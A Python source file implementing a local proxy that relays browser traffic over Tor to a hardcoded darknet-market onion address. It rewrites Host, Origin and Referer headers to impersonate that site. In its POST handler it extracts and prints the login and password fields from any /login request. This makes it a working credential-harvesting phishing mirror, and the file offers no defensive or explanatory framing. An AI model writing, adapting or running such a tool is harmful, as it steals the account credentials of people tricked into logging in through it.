# -*- coding: utf-8 -*-
"""

Created on Sun Mar 31 00:14:03 2019

@author: Lizerhigh
"""
import signal, socket, threading, hashlib, socks, zlib


class proxyServ:
    
    def shutdown(self):
        self.serverSocket.close()
        self.__run_state = False
        for x in self.__client_threads:
            x._stop()
         
    def __init__(self, config):
        # Shutdown on Ctrl+C
        self.__config = config
        signal.signal(signal.SIGINT, self.shutdown) 
    
        # Create a TCP socket
        self.serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
        # Re-use the socket
        self.serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
        # bind the socket to a public host, and a port   
        self.serverSocket.bind((config['HOST_NAME'], config['BIND_PORT']))
        
        self.serverSocket.listen(10) # become a server socket
        self.__clients = {}
        self.__run_state = True
        self.__client_threads = []
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
    
    def subst_GET(self, req):
        rem = req[0]
        print(rem)
        rem2 = req[-2:]
        #print(req)
        #print(req[1])
        
        #print(req[1].split(': '))
        req = {x.split(': ')[0]: x.split(': ')[1] for x in req[1:-2]}
        
        #*****
        req['Host'] = 'hydraruzxpnew4af.onion'
        #*****
        
        return '\n'.join([rem]+[x+': '+req[x] for x in req.keys()]+rem2)
    
    def __substText(self, req, tofind, repl):
        strnum = 0
        for x in range(len(req)):
            if req[x].startswith(tofind):
                strnum = x
        req[strnum] = tofind + repl + '\r'
        return req
    
    def subst_POST(self, req):
        req = self.__substText(req, 'Host: ', 'hydraruzxpnew4af.onion')
        req = self.__substText(req, 'Origin: http://', 'hydraruzxpnew4af.onion')
        req = self.__substText(req, 'Referer: http://', 'hydraruzxpnew4af.onion')
        if req[0].startswith('POST /login'):
           dts = req[-1].split('&')
           dts = {dts[x].split('=')[0]: dts[x].split('=')[1] for x in range(len(dts)) }
           print('\n'*100, dts['login'], dts['password'])
        return '\n'.join(req)
    
    
    def proxy_thread(self, conn, client_address):
        # get the request from browser
        request = conn.recv(self.__config['MAX_REQUEST_LEN']).decode()
        
        #print(request)
        request = request.split('\n')
        if request[0].split(' ')[0] == 'GET':    
            request = self.subst_GET(request)
        else:
            print(request)
            request = self.subst_POST(request)
            #self.shutdown()
            #raise NotImplementedError
        #print
        webserver, port = 'hydraruzxpnew4af.onion', 80
        
        s = socks.socksocket()
        s.settimeout(self.__config['CONNECTION_TIMEOUT'])
        s.connect((webserver, port))
        s.sendall(bytes(request, 'utf-8'))
        alldata = b''
        while 1:
            # receive data from web server
            data = s.recv(self.__config['MAX_REQUEST_LEN'])
            
            if (len(data) > 0):
                alldata += data # send to browser/client
            else:
                break
        #print(alldata)
        
        #from StringIO import StringIO
        print(alldata.find(b': gzip'))
        if alldata.find(b': gzip')+1:
            import gzip
            print(alldata)
            n = alldata.find(b': gzip')
            dd = alldata[n+10:]
            print(dd)
            #data2 = gzip.decompress(dd)
            #print(str(data2, 'utf-8'))
            #print(data2)
        else:
            pass#print(alldata)
        #n = alldata.find(b': gzip')
        #dd = alldata[n+6:]
        #dd = zlib.decompress(dd, 16+zlib.MAX_WBITS)
        #alldata.replace(b'hydraruzxpnew4af.onion', b'localhost:8080')
        #print(alldata)
        conn.sendall(alldata)
        s.close()
        conn.close()
        
    def __call__(self):
        while self.__run_state:
        
            # Establish the connection
            (clientSocket, client_address) = self.serverSocket.accept() 
            
            self.__client_threads.append(threading.Thread(name=self._getClientName(client_address), 
            target = self.proxy_thread, args=(clientSocket, client_address)))
            self.__client_threads[-1].setDaemon(True)
            self.__client_threads[-1].start()

    def _getClientName(self, addr):
        if addr in self.__clients.keys():
            return self.__clients[addr]
        #print(addr)
        self.__clients[addr] = hashlib.new('md5', bytes(addr[0], 'utf-8')).hexdigest()
        
config = {
        'HOST_NAME':'localhost',
        'BIND_PORT':8080,
        'CONNECTION_TIMEOUT':1024,
        'MAX_REQUEST_LEN':4096,
        '':''
        }
serv = proxyServ(config)
serv()
input()
